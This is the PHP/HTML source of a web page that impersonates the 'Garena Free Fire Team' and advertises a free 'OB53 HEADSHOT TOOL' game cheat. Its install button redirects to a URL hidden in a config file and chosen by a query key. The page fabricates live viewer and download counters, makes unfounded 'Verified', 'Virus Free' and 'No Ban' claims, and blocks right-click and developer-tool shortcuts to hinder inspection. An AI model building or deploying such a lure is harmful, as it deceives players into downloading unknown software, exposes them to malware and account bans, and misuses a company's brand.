<?php

// get ?p=key
$themeKey = $_GET['p'] ?? '';

// default fallback
$redirectUrl = '#';

// load themes.config from same folder
$configFile = __DIR__ . '/themes.config';

if (file_exists($configFile)) {

    $configs = json_decode(file_get_contents($configFile), true);

    if (is_array($configs)) {

        foreach ($configs as $item) {

            if (($item['key'] ?? '') === $themeKey) {

                $redirectUrl = $item['url'] ?? '#';
                break;
            }
        }
    }
}

?>
<html lang="en">
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
  <meta name="monetag" content="40468b9e49746967575b38c0fdbd8e6a">
  <title>Garena Free Fire Team - Video Portal</title>
  <link rel="preconnect" href="https://fonts.googleapis.com/">
  <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&amp;family=DM+Sans:wght@300;400;500;700&amp;family=JetBrains+Mono:wght@400;700&amp;display=swap" rel="stylesheet">
  <style>
    :root {
      --black:   #08080a;
      --surface: #101014;
      --panel:   #18181f;
      --line:    rgba(255,255,255,0.07);
      --red:     #2ade74;
      --red-bright: #4cff95;
      --red-dim: rgba(42,222,116,0.18);
      --red:   #2ade74;
      --gold:    #ffb800;
      --white:   #f2f2f0;
      --grey:    #7a7a88;
      --mono:    'JetBrains Mono', monospace;
      --display: 'Bebas Neue', sans-serif;
      --body:    'DM Sans', sans-serif;
    }

    *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color: transparent; -webkit-touch-callout: none; }
    html { scroll-behavior:smooth; }

    body {
      background: var(--black);
      font-family: var(--body);
      color: var(--white);
      min-height: 100vh;
      -webkit-font-smoothing: antialiased;
      padding-bottom: env(safe-area-inset-bottom);
    }

    body::after {
      content: '';
      position: fixed;
      inset: 0;
      background: repeating-linear-gradient(
        0deg,
        transparent,
        transparent 2px,
        rgba(0,0,0,0.04) 2px,
        rgba(0,0,0,0.04) 4px
      );
      pointer-events: none;
      z-index: 9999;
    }

    /* HEADER */
    header {
      border-bottom: 1px solid var(--line);
      padding: 0 32px;
      height: 52px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      position: sticky;
      top: 0;
      background: rgba(8,8,10,0.94);
      backdrop-filter: blur(16px);
      z-index: 100;
    }

    .header-left {
      display: flex;
      align-items: center;
      gap: 14px;
    }

    .wordmark {
      font-family: var(--display);
      font-size: 22px;
      letter-spacing: 3px;
      color: var(--white);
      line-height: 1;
    }

    .wordmark span { color: #00c853; }

    .header-divider {
      width: 1px;
      height: 18px;
      background: var(--line);
    }

    .header-sub {
      font-family: var(--mono);
      font-size: 10px;
      color: var(--grey);
      letter-spacing: 2px;
      text-transform: uppercase;
    }

    .header-live {
      display: flex;
      align-items: center;
      gap: 6px;
      font-family: var(--mono);
      font-size: 10px;
      color: var(--white);
      letter-spacing: 1.5px;
      text-transform: uppercase;
    }

    .live-dot {
      width: 7px; height: 7px;
      border-radius: 50%;
      background: #00e676;
      animation: pulse-dot 1.4s ease-in-out infinite;
    }

    @keyframes pulse-dot {
      0%, 100% { opacity: 1; transform: scale(1); box-shadow: 0 0 0 0 rgba(0,200,83,0.6); }
      50% { opacity: 0.6; transform: scale(1.15); box-shadow: 0 0 0 6px rgba(0,200,83,0); }
    }

    /* TICKER */
    .hero-band {
      background: #00c853;
      padding: 8px 0;
      overflow: hidden;
      position: relative;
    }

    .hero-band::before,
    .hero-band::after {
      content: '';
      position: absolute;
      top: 0; bottom: 0;
      width: 40px;
      z-index: 2;
      pointer-events: none;
    }
    .hero-band::before { left: 0; background: linear-gradient(90deg, #00c853, transparent); }
    .hero-band::after { right: 0; background: linear-gradient(-90deg, #00c853, transparent); }

    .ticker-track {
      display: flex;
      gap: 50px;
      animation: ticker 22s linear infinite;
      white-space: nowrap;
      width: max-content;
    }

    .ticker-track span {
      font-family: var(--display);
      font-size: 13px;
      letter-spacing: 4px;
      color: #fff;
      text-transform: uppercase;
      opacity: 0.95;
    }

    @keyframes ticker {
      from { transform: translateX(0); }
      to   { transform: translateX(-50%); }
    }

    /* LAYOUT */
    .page {
      max-width: 940px;
      margin: 0 auto;
      padding: 28px 24px 60px;
    }

    /* BLOCK HEADER */
    .block-header {
      display: grid;
      grid-template-columns: auto 1fr auto;
      align-items: center;
      gap: 16px;
      margin-bottom: 18px;
    }

    .block-num {
      font-family: var(--mono);
      font-size: 11px;
      color: var(--red);
      letter-spacing: 1px;
    }

    .block-rule {
      height: 1px;
      background: var(--line);
    }

    .block-title {
      font-family: var(--display);
      font-size: 13px;
      letter-spacing: 5px;
      color: var(--grey);
      text-transform: uppercase;
    }

    /* VIDEO */
    .video-block { margin-bottom: 38px; }

    .video-frame {
      position: relative;
      overflow: hidden;
      background: #000;
      border-top: 3px solid var(--red);
      border-left: 1px solid var(--line);
      border-right: 1px solid var(--line);
      border-bottom: 1px solid var(--line);
    }

    .frame-corner {
      position: absolute;
      top: 0; left: 0;
      width: 40px; height: 40px;
      pointer-events: none;
      z-index: 4;
    }
    .frame-corner::before {
      content: '';
      position: absolute;
      top: 0; left: 0;
      width: 40px; height: 3px;
      background: var(--red);
    }
    .frame-corner::after {
      content: '';
      position: absolute;
      top: 0; left: 0;
      width: 3px; height: 40px;
      background: var(--red);
    }

    .frame-corner-br {
      position: absolute;
      bottom: 0; right: 0;
      width: 40px; height: 40px;
      pointer-events: none;
      z-index: 4;
    }
    .frame-corner-br::before {
      content: '';
      position: absolute;
      bottom: 0; right: 0;
      width: 40px; height: 1px;
      background: rgba(232,42,42,0.4);
    }
    .frame-corner-br::after {
      content: '';
      position: absolute;
      bottom: 0; right: 0;
      width: 1px; height: 40px;
      background: rgba(232,42,42,0.4);
    }

    .video-frame video {
      width: 100%;
      height: auto;
      display: block;
    }

    .video-badge {
      position: absolute;
      top: 14px; right: 14px;
      display: flex;
      align-items: center;
      gap: 6px;
      padding: 5px 10px;
      background: rgba(0,0,0,0.7);
      backdrop-filter: blur(8px);
      border: 1px solid rgba(255,56,56,0.4);
      font-family: var(--mono);
      font-size: 9px;
      letter-spacing: 1.5px;
      color: var(--white);
      text-transform: uppercase;
      z-index: 5;
    }

    .video-badge .live-dot { width: 6px; height: 6px; }

    .video-index {
      position: absolute;
      bottom: 14px; left: 16px;
      font-family: var(--mono);
      font-size: 10px;
      letter-spacing: 2px;
      color: rgba(255,255,255,0.3);
      pointer-events: none;
      z-index: 4;
      text-transform: uppercase;
    }

    /* APP CARD */
    .card-wrap { margin-top: 0; }

    .card-header-row {
      display: grid;
      grid-template-columns: auto 1fr auto;
      align-items: center;
      gap: 16px;
      padding-bottom: 14px;
      border-bottom: 1px solid var(--line);
      margin-bottom: 0;
    }

    .app-card {
      display: grid;
      grid-template-columns: auto 1fr;
      gap: 0;
      background: var(--panel);
      border: 1px solid var(--line);
      border-top: none;
      border-left: 3px solid var(--red);
      position: relative;
      overflow: hidden;
    }

    .app-card::before {
      content: '';
      position: absolute;
      top: -80px; right: -80px;
      width: 240px; height: 240px;
      background: var(--red-dim);
      transform: rotate(45deg);
      pointer-events: none;
    }

    .card-icon-col {
      padding: 28px 24px 28px 28px;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      border-right: 1px solid var(--line);
      position: relative;
      z-index: 2;
    }

    .app-icon {
      width: 70px; height: 70px;
      border-radius: 14px;
      object-fit: cover;
      display: block;
      filter: drop-shadow(0 8px 24px rgba(0,0,0,0.6));
      border: 2px solid rgba(255,255,255,0.06);
    }

    .icon-rating-row {
      margin-top: 12px;
      display: flex;
      align-items: center;
      gap: 12px;
      justify-content: center;
    }

    .icon-rating {
      display: flex;
      gap: 2px;
      align-items: center;
    }

    .icon-rating svg {
      width: 12px; height: 12px;
      fill: var(--gold);
    }

    .rating-num {
      font-family: var(--mono);
      font-size: 10px;
      color: var(--white);
      margin-left: 5px;
      font-weight: 700;
    }

    .card-info-col {
      padding: 28px 28px 28px 24px;
      display: flex;
      flex-direction: column;
      position: relative;
      z-index: 2;
    }

    .verified-row {
      display: flex;
      align-items: center;
      gap: 8px;
      margin-bottom: 10px;
    }

    .verified-tag {
      display: inline-flex;
      align-items: center;
      gap: 5px;
      font-family: var(--mono);
      font-size: 9px;
      letter-spacing: 1.5px;
      text-transform: uppercase;
      padding: 3px 8px;
      border: 1px solid rgba(42,222,116,0.4);
      background: rgba(42,222,116,0.1);
      color: var(--green);
    }

    .verified-tag svg { width: 10px; height: 10px; fill: var(--green); }

    .app-title {
      font-family: var(--display);
      font-size: 38px;
      letter-spacing: 3px;
      line-height: 0.95;
      color: var(--white);
      margin-bottom: 8px;
    }

    .app-desc {
      font-family: var(--mono);
      font-size: 10px;
      letter-spacing: 2px;
      color: var(--grey);
      text-transform: uppercase;
      margin-bottom: 20px;
      line-height: 1.6;
    }

    .card-stats {
      display: flex;
      gap: 24px;
      padding: 14px 0;
      border-top: 1px solid var(--line);
      border-bottom: 1px solid var(--line);
      margin-bottom: 22px;
    }

    .cstat-val {
      font-family: var(--display);
      font-size: 22px;
      letter-spacing: 1px;
      color: var(--white);
      display: block;
      line-height: 1;
    }

    .cstat-val.accent { color: var(--red-bright); }

    .cstat-key {
      font-family: var(--mono);
      font-size: 9px;
      letter-spacing: 2px;
      color: var(--grey);
      text-transform: uppercase;
      display: block;
      margin-top: 4px;
    }

    /* INSTALL BUTTON */
    .install-btn {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
      padding: 17px 30px;
      background: var(--red);
      color: #fff;
      text-decoration: none;
      font-family: var(--display);
      font-size: 22px;
      letter-spacing: 3px;
      text-transform: uppercase;
      cursor: pointer;
      position: relative;
      overflow: hidden;
      align-self: stretch;
      box-shadow: 0 6px 24px rgba(232,42,42,0.4), inset 0 1px 0 rgba(255,255,255,0.2);
      animation: btn-pulse 2.2s ease-in-out infinite;
    }

    @keyframes btn-pulse {
      0%, 100% { box-shadow: 0 6px 24px rgba(232,42,42,0.4), inset 0 1px 0 rgba(255,255,255,0.2), 0 0 0 0 rgba(232,42,42,0.5); }
      50% { box-shadow: 0 6px 28px rgba(232,42,42,0.6), inset 0 1px 0 rgba(255,255,255,0.2), 0 0 0 8px rgba(232,42,42,0); }
    }

    .install-btn::before {
      content: '';
      position: absolute;
      top: 0; left: -100%;
      width: 100%; height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
      animation: shine 3s ease-in-out infinite;
    }

    @keyframes shine {
      0%, 100% { left: -100%; }
      50% { left: 100%; }
    }

    .install-btn:hover { background: var(--red-bright); }
    .install-btn:active { transform: scale(0.98); }

    .install-btn span,
    .install-btn svg {
      position: relative;
      z-index: 1;
    }

    .install-btn svg {
      width: 18px; height: 18px;
      fill: currentColor;
      animation: bounce-down 1.6s ease-in-out infinite;
    }

    @keyframes bounce-down {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(3px); }
    }

    /* CAPTION */
    .card-caption {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 11px 14px;
      background: var(--surface);
      border: 1px solid var(--line);
      border-left: 3px solid rgba(232,42,42,0.3);
      border-top: none;
      gap: 12px;
    }

    .caption-text {
      font-family: var(--mono);
      font-size: 10px;
      letter-spacing: 1.5px;
      color: var(--grey);
      text-transform: uppercase;
    }

    .caption-text strong { color: var(--white); }



    /* SHARE BUTTON */
    .share-btn {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      padding: 10px 18px;
      background: rgba(255,255,255,0.06);
      border: 1px solid rgba(255,255,255,0.22);
      color: var(--white);
      font-family: var(--mono);
      font-size: 11px;
      letter-spacing: 2px;
      text-transform: uppercase;
      cursor: pointer;
      position: relative;
      overflow: hidden;
      white-space: nowrap;
      flex-shrink: 0;
      box-shadow: 0 0 0 0 rgba(255,255,255,0.1);
      animation: share-pulse 2.6s ease-in-out infinite;
      transition: background 0.2s, border-color 0.2s, transform 0.1s;
    }

    @keyframes share-pulse {
      0%, 100% { box-shadow: 0 0 0 0 rgba(255,255,255,0.12), 0 2px 12px rgba(0,0,0,0.3); }
      50%       { box-shadow: 0 0 0 5px rgba(255,255,255,0), 0 2px 16px rgba(0,0,0,0.4); }
    }

    .share-btn::before {
      content: '';
      position: absolute;
      top: 0; left: -100%;
      width: 100%; height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.18), transparent);
      animation: share-shine 3s ease-in-out infinite;
    }

    @keyframes share-shine {
      0%, 100% { left: -100%; }
      50%       { left: 100%; }
    }

    .share-btn svg {
      width: 15px; height: 15px;
      fill: currentColor;
      flex-shrink: 0;
      position: relative;
      z-index: 1;
    }

    .share-btn span { position: relative; z-index: 1; }

    .share-btn:hover {
      background: rgba(255,255,255,0.12);
      border-color: rgba(255,255,255,0.4);
      transform: translateY(-1px);
    }

    .share-btn:active { transform: scale(0.97); }

    .share-btn.copied {
      border-color: rgba(42,222,116,0.5);
      color: var(--green);
      background: rgba(42,222,116,0.1);
      animation: none;
      box-shadow: 0 0 12px rgba(42,222,116,0.2);
    }

    /* TRUST ROW */
    .trust-row {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 10px;
      margin-top: 16px;
    }

    .trust-item {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 6px;
      padding: 14px 8px;
      background: var(--surface);
      border: 1px solid var(--line);
      text-align: center;
    }

    .trust-item svg {
      width: 18px; height: 18px;
      fill: var(--red-bright);
    }

    .trust-item-text {
      font-family: var(--mono);
      font-size: 9px;
      color: var(--grey);
      letter-spacing: 1px;
      text-transform: uppercase;
      line-height: 1.4;
    }

    .trust-item-text strong {
      color: var(--white);
      display: block;
      font-size: 10px;
    }

    /* FOOTER */
    .footer {
      padding: 30px 24px 24px;
      text-align: center;
      border-top: 1px solid var(--line);
    }

    .footer p {
      font-family: var(--mono);
      font-size: 10px;
      letter-spacing: 2px;
      color: var(--grey);
      text-transform: uppercase;
    }

    /* ENTRY ANIMS */
    .reveal {
      opacity: 0;
      transform: translateY(20px);
      animation: reveal 0.5s ease forwards;
    }
    .r1 { animation-delay: 0.05s; }
    .r2 { animation-delay: 0.18s; }
    .r3 { animation-delay: 0.30s; }

    @keyframes reveal {
      to { opacity:1; transform: translateY(0); }
    }

    /* RESPONSIVE - MOBILE OPTIMIZED */
    @media (max-width: 600px) {
      header { padding: 0 14px; height: 48px; }
      .header-sub { display: none; }
      .wordmark { font-size: 17px; letter-spacing: 2px; }
      .header-live { font-size: 9px; }

      .hero-band { padding: 7px 0; }
      .ticker-track span { font-size: 11px; letter-spacing: 3px; }

      .page { padding: 14px 12px 40px; }

      .video-block { margin-bottom: 28px; }
      .block-header { margin-bottom: 14px; }
      .block-title { font-size: 11px; letter-spacing: 3px; }

      .app-card { grid-template-columns: 1fr; }

      .card-icon-col {
        flex-direction: row;
        gap: 16px;
        padding: 18px;
        border-right: none;
        border-bottom: 1px solid var(--line);
        justify-content: flex-start;
        align-items: center;
      }
      .icon-rating-row { margin-top: 0; flex-wrap: wrap; }
      .card-info-col { padding: 20px 18px; }
      .app-title { font-size: 26px; }

      .card-stats { gap: 14px; flex-wrap: wrap; }
      .cstat-val { font-size: 18px; }

      .install-btn {
        font-size: 18px;
        width: 100%;
        padding: 16px;
        letter-spacing: 2.5px;
      }

      .trust-row { gap: 8px; margin-top: 14px; }
      .trust-item { padding: 12px 6px; }
      .trust-item-text { font-size: 8px; }
      .trust-item-text strong { font-size: 9px; }

      .footer { padding: 24px 14px 18px; }
    }


  </style>
</head>
<body cz-shortcut-listen="true">

  <header>
    <div class="header-left">
      <div class="wordmark">FREE<span>FIRE</span></div>
      <div class="header-divider"></div>
      <div class="header-sub">Video Portal</div>
    </div>
    <div class="header-live">
      <div class="live-dot"></div>
      <span id="viewerCount">1,269</span>&nbsp;Online
    </div>
  </header>

  <div class="hero-band" aria-hidden="true">
    <div class="ticker-track">
      <span>Garena Free Fire</span>
      <span>—</span>
      <span>OB53 HEADSHOT TOOL</span>
      <span>—</span>
      <span>Unlimited Access</span>
      <span>—</span>
      <span>Premium Content</span>
      <span>—</span>
      <span>Watch Now</span>
      <span>—</span>
      <span>Garena Free Fire</span>
      <span>—</span>
      <span>OB53 HEADSHOT TOOL</span>
      <span>—</span>
      <span>Unlimited Access</span>
      <span>—</span>
      <span>Premium Content</span>
      <span>—</span>
      <span>Watch Now</span>
      <span>—</span>
    </div>
  </div>

  <div class="page">

    <!-- Video -->
    <div class="video-block reveal r1">
      <div class="block-header">
        <span class="block-num">01</span>
        <div class="block-rule"></div>
        <span class="block-title">Watch Full Video</span>
      </div>
      <div class="video-frame">
        <div class="frame-corner"></div>
        <div class="frame-corner-br"></div>

        <video controls="" controlslist="nodownload noremoteplayback" disablepictureinpicture="" oncontextmenu="return false;" id="protectedVideo" preload="auto" playsinline="" autoplay="">
          <source src="https://github.com/repokinghoro/images/raw/refs/heads/main/ff-sensi-t.mp4">
          Your browser does not support the video tag.
        </video>
        <div class="video-index">FF • VDO • 2026</div>
      </div>
    </div>

    <!-- Card -->
    <div class="card-wrap reveal r2">
      <div class="card-header-row">
        <span class="block-num">02</span>
        <div class="block-rule"></div>
        <span class="block-title">Install App</span>
      </div>

      <div class="app-card">
        <div class="card-icon-col">
          <img src="https://3sensiff.gmloot.in/pnlff.png" alt="OB53 Proxy Server Icon" class="app-icon">
          <div class="icon-rating-row">
            <div class="icon-rating">
              <svg viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path></svg>
              <svg viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path></svg>
              <svg viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path></svg>
              <svg viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path></svg>
              <svg viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path></svg>
              <span class="rating-num">4.9</span>
            </div>
            <button class="share-btn" id="shareBtn" onclick="handleShare()" aria-label="Share">
              <svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92s2.92-1.31 2.92-2.92-1.31-2.92-2.92-2.92z"></path></svg>
              <span>Share</span>
            </button>
          </div>
        </div>

        <div class="card-info-col">
          <div class="verified-row">
            <span class="verified-tag">
              <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"></path></svg>
              Verified
            </span>
            <span class="verified-tag" style="border-color:rgba(255,184,0,0.4);background:rgba(255,184,0,0.1);color:var(--gold);">
              Editor's Pick
            </span>
          </div>

          <div class="app-title">OB53 HEADSHOT TOOL</div>
          <div class="app-desc">Free Fire HEADSHOT TOOL<br>Unlimited Access • No Ban</div>

          <div class="card-stats">
            <div>
              <span class="cstat-val">OB53</span>
              <span class="cstat-key">Version</span>
            </div>
            <div>
              <span class="cstat-val accent">FREE</span>
              <span class="cstat-key">Price</span>
            </div>
            <div>
              <span class="cstat-val">24/7</span>
              <span class="cstat-key">Uptime</span>
            </div>
            <div>
              <span class="cstat-val">78K+</span>
              <span class="cstat-key">Downloads</span>
            </div>
          </div>

         <a href="<?= htmlspecialchars($redirectUrl) ?>" 
           target="_blank" 
           class="install-btn">
        
          <svg viewBox="0 0 24 24" aria-hidden="true">
            <path d="M19 9h-4V3H9v6H5l7 7 7-7zm-8 2V5h2v6h1.17L12 13.17 9.83 11H11zm-6 7h14v2H5v-2z"></path>
          </svg>
        
          <span>Install Free Now</span>
        </a>
        </div>
      </div>

      <div class="card-caption">
        <span class="caption-text"><strong id="recentDownloads">2,872</strong>&nbsp;Downloads in Last Hour</span>
      </div>

      <!-- TRUST ROW -->
      <div class="trust-row">
        <div class="trust-item">
          <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"></path></svg>
          <div class="trust-item-text"><strong>Virus</strong>Free</div>
        </div>
        <div class="trust-item">
          <svg viewBox="0 0 24 24"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"></path></svg>
          <div class="trust-item-text"><strong>Fast</strong>Install</div>
        </div>
        <div class="trust-item">
          <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"></path></svg>
          <div class="trust-item-text"><strong>78K+</strong>Users</div>
        </div>
      </div>
    </div>

  </div>

  <div class="footer">
    <p>© 2026 — Garena Free Fire Team — All Rights Reserved</p>
  </div>

  <script>
    // Share handler
    function handleShare() {
      const btn = document.getElementById('shareBtn');
      const url = window.location.href;
      const title = 'OB53 Proxy Server – Free Fire';

      if (navigator.share) {
        navigator.share({ title, url }).catch(() => {});
      } else {
        navigator.clipboard.writeText(url).then(() => {
          btn.classList.add('copied');
          const span = btn.querySelector('span');
          if (span) span.textContent = 'Copied!';
          setTimeout(() => {
            btn.classList.remove('copied');
            if (span) span.textContent = 'Share';
          }, 2000);
        }).catch(() => {});
      }
    }

    // Animated viewer count (social proof)
    const viewerEl = document.getElementById('viewerCount');
    let viewers = 1247;
    setInterval(() => {
      const change = Math.floor(Math.random() * 9) - 3;
      viewers = Math.max(1100, Math.min(1500, viewers + change));
      if (viewerEl) viewerEl.textContent = viewers.toLocaleString();
    }, 2400);

    // Animated recent downloads counter
    const dlEl = document.getElementById('recentDownloads');
    let downloads = 2847;
    setInterval(() => {
      downloads += Math.floor(Math.random() * 3) + 1;
      if (dlEl) dlEl.textContent = downloads.toLocaleString();
    }, 3200);

    // Anti-inspect
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.addEventListener('keydown', e => {
      if (
        e.keyCode === 123 ||
        (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) ||
        (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83))
      ) e.preventDefault();
    });

    // Video autoplay
    const video = document.getElementById('protectedVideo');
    if (video) {
      video.volume = 1.0;
      video.addEventListener('contextmenu', e => e.preventDefault());
      video.addEventListener('dragstart', e => e.preventDefault());
      let played = false;
      const tryPlay = () => {
        if (played) return;
        played = true;
        video.play().catch(() => {
          document.addEventListener('click', function once() {
            video.play();
            document.removeEventListener('click', once);
          }, { once: true });
        });
      };
      if (video.readyState >= 3) tryPlay();
      else video.addEventListener('canplay', tryPlay, { once: true });
    }
  </script>
</body>
</html>